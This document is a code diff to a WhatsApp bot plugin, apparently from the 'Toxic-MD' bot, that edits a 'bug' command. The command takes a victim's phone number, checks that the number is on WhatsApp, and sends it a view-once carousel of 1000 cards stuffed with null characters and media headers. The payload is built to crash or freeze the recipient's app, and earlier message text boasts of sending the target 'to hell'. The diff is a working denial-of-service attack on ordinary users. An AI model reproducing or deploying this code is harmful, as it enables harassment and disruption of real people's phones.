@@ -4,71 +4,60 @@ const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
 zokou(
   {
     nomCom: "bug",
-    categorie: "Fun",
-    reaction: "🎠",
+    categorie: "Mods",
+    reaction: "💀",
   },
   async (dest, zk, commandeOptions) => {
     const { ms, repondre, arg } = commandeOptions;
 
     try {
-      // Function to normalize phone numbers (remove spaces, ensure country code starts with +)
+      // Function to normalize phone numbers
       const normalizePhoneNumber = (number) => {
         if (!number) return null;
-        // Remove spaces and non-digit characters except +
         let normalized = number.replace(/[^+\d]/g, '');
-        // If the number starts with a country code without +, add +
         if (normalized.match(/^\d/)) {
           normalized = '+' + normalized;
         }
-        // Ensure the number starts with + and is followed by digits
         if (!normalized.match(/^\+\d{10,15}$/)) {
-          return null; // Invalid number
+          return null;
         }
         return normalized;
       };
 
-      // Extract the sender's number from the message metadata
       const senderJid = ms.key.participant || ms.key.remoteJid;
       if (!senderJid) {
-        return repondre("𝗘𝗿𝗿𝗼𝗿: 𝗖𝗼𝘂𝗹𝗱 𝗻𝗼𝘁 𝗶𝗱𝗲𝗻𝘁𝗶𝗳𝘆 𝘁𝗵𝗲 𝘀𝗲𝗻𝗱𝗲𝗿. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿. 😓");
+        return repondre("𝐄𝐫𝐫𝐨𝐫: 𝐂𝐨𝐮𝐥𝐝 𝐧𝐨𝐭 𝐢𝐝𝐞𝐧𝐭𝐢𝐟𝐲 𝐬𝐞𝐧𝐝𝐞𝐫. 𝐓𝐫𝐲 𝐚𝐠𝐚𝐢𝐧 𝐥𝐚𝐭𝐞𝐫.");
       }
 
-      // Normalize the sender's number
       const senderNumber = normalizePhoneNumber(senderJid.split('@')[0]);
       if (!senderNumber) {
-        return repondre("𝗘𝗿𝗿𝗼𝗿: 𝗖𝗼𝘂𝗹𝗱 𝗻𝗼𝘁 𝘃𝗲𝗿𝗶𝗳𝘆 𝘆𝗼𝘂𝗿 𝗻𝘂𝗺𝗯𝗲𝗿. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿. 😓");
+        return repondre("𝐄𝐫𝐫𝐨𝐫: 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐬𝐞𝐧𝐝𝐞𝐫 𝐧𝐮𝐦𝐛𝐞𝐫.");
       }
 
-      // Restrict the command to the owner (+254735342808)
       const ownerNumber = normalizePhoneNumber("+254735342808");
       if (senderNumber !== ownerNumber) {
-        return repondre("𝗦𝗼𝗿𝗿𝘆, 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿 (+𝟮𝟱𝟰𝟳𝟯𝟱𝟯𝟰𝟮𝟴𝟴𝟴)! 🚫");
+        return repondre("𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲! 𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐢𝐬 𝐫𝐞𝐬𝐭𝐫𝐢𝐜𝐭𝐞𝐝 𝐭𝐨 +𝟐𝟓𝟒𝟕𝟑𝟓𝟑𝟒𝟐𝟖𝟎𝟖");
       }
 
-      // Check if a phone number was provided
       if (!arg[0]) {
-        return repondre("𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝗻𝘂𝗺𝗯𝗲𝗿 𝘁𝗼 𝘀𝗲𝗻𝗱 𝘁𝗼 𝗵𝗲𝗹𝗹! 😈");
+        return repondre("𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐩𝐡𝐨𝐧𝐞 𝐧𝐮𝐦𝐛𝐞𝐫");
       }
 
-      // Normalize the target phone number
       const phoneNumber = normalizePhoneNumber(arg[0]);
       if (!phoneNumber) {
-        return repondre("𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗵𝗼𝗻𝗲 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗜𝘁 𝗺𝘂𝘀𝘁 𝘀𝘁𝗮𝗿𝘁 𝘄𝗶𝘁𝗵 𝗮 𝗰𝗼𝘂𝗻𝘁𝗿𝘆 𝗰𝗼𝗱𝗲 𝗹𝗶𝗸𝗲 +𝟮𝟱𝟰 𝗼𝗿 𝟮𝟱𝟰 𝗮𝗻𝗱 𝗯𝗲 𝟭𝟬-𝟭𝟱 𝗱𝗶𝗴𝗶𝘁𝘀 𝗹𝗼𝗻𝗴. 🤔");
+        return repondre("𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫 𝐟𝐨𝐫𝐦𝐚𝐭. 𝐔𝐬𝐞 +𝐂𝐎𝐔𝐍𝐓𝐑𝐘𝐂𝐎𝐃𝐄𝐍𝐔𝐌𝐁𝐄𝐑");
       }
 
-      // Verify if the target number is on WhatsApp
       const [result] = await zk.onWhatsApp(phoneNumber);
       if (!result.exists) {
-        return repondre("𝗧𝗵𝗮𝘁 𝗻𝘂𝗺𝗯𝗲𝗿 𝗶𝘀𝗻’𝘁 𝗼𝗻 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽! 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮 𝗱𝗶𝗳𝗳𝗲𝗿𝗲𝗻𝘁 𝗻𝘂𝗺𝗯𝗲𝗿. 😓");
+        return repondre("𝐍𝐮𝐦𝐛𝐞𝐫 𝐧𝐨𝐭 𝐨𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩: " + phoneNumber);
       }
 
-      // The JID (WhatsApp ID) of the target number
       const targetJid = result.jid;
 
-      // Notify the user that the carousel is being prepared
-      repondre("𝗣𝗿𝗲𝗽𝗮𝗿𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗼𝘂𝘀𝗲𝗹 𝗳𝗼𝗿 " + phoneNumber + "… 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁! 🎠");
+      repondre("𝐏𝐫𝐞𝐩𝐚𝐫𝐢𝐧𝐠 𝐜𝐚𝐫𝐨𝐮𝐬𝐞𝐥 𝐟𝐨𝐫 " + phoneNumber + "...");
 
-      // Prepare buttons for each card (same as original)
+      // Prepare buttons and cards (same as original)
       let buttons = [];
       for (let i = 0; i < 5; i++) {
         buttons.push({
@@ -86,18 +75,13 @@ zokou(
         });
       }
 
-      // Prepare carousel cards (1000 cards as in original)
       let cards = [];
       for (let i = 0; i < 1000; i++) {
         cards.push({
-          body: {
-            text: `\u0000\u0000\u0000\u0000\u0000`,
-          },
-          footer: {
-            text: "𝐓𝐨𝐱𝐢𝐜-𝐌𝐃 𝐛𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧",
-          },
+          body: { text: `\u0000\u0000\u0000\u0000\u0000` },
+          footer: { text: "𝐓𝐨𝐱𝐢𝐜-𝐌𝐃 𝐛𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧" },
           header: {
-            title: '🍀 𝗧𝗼𝘅𝗶𝗰-𝗠𝗗 𝗖𝗮𝗿𝗼𝘂𝘀𝗲𝗹 \u0000\u0000\u0000\u0000',
+            title: '🍀 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃 𝐂𝐚𝐫𝐨𝐮𝐬𝐞𝐥 \u0000\u0000\u0000\u0000',
             hasMediaAttachment: true,
             imageMessage: {
               url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
@@ -116,13 +100,10 @@ zokou(
               midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro=",
             },
           },
-          nativeFlowMessage: {
-            buttons: buttons,
-          },
+          nativeFlowMessage: { buttons: buttons },
         });
       }
 
-      // Create the carousel message using raw Baileys methods
       const carousel = generateWAMessageFromContent(targetJid, {
         viewOnceMessage: {
           message: {
@@ -131,32 +112,22 @@ zokou(
               deviceListMetadataVersion: 2,
             },
             interactiveMessage: {
-              body: {
-                text: '\u0000\u0000\u0000\u0000',
-              },
-              footer: {
-                text: "𝐓𝐨𝐱𝐢𝐜-𝐌𝐃 𝐛𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧",
-              },
-              header: {
-                hasMediaAttachment: false,
-              },
-              carouselMessage: {
-                cards: cards,
-              },
+              body: { text: '\u0000\u0000\u0000\u0000' },
+              footer: { text: "𝐓𝐨𝐱𝐢𝐜-𝐌𝐃 𝐛𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧" },
+              header: { hasMediaAttachment: false },
+              carouselMessage: { cards: cards },
             },
           },
         },
       }, {});
 
-      // Send the carousel message using raw Baileys relayMessage
       await zk.relayMessage(targetJid, carousel.message, { messageId: carousel.key.id });
 
-      // Notify the user that the carousel was sent
-      repondre("𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘀𝗲𝗻𝘁 𝘁𝗼 𝗵𝗲𝗹𝗹! 🔥");
+      repondre("𝐂𝐚𝐫𝐨𝐮𝐬𝐞𝐥 𝐬𝐞𝐧𝐭 𝐭𝐨 " + phoneNumber + "!");
 
     } catch (error) {
-      console.error("Error in .bug command:", error);
-      repondre("𝗢𝗼𝗽𝘀, 𝘀𝗼𝗺𝗲𝘁𝗵𝗶𝗻𝗴 𝘄𝗲𝗻𝘁 𝘄𝗿𝗼𝗻𝗴 𝘄𝗵𝗶𝗹𝗲 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝘁𝗵𝗲 𝗰𝗮𝗿𝗼𝘂𝘀𝗲𝗹: " + error.message);
+      console.error("Error:", error);
+      repondre("𝐄𝐫𝐫𝐨𝐫: " + error.message);
     }
   }
 );
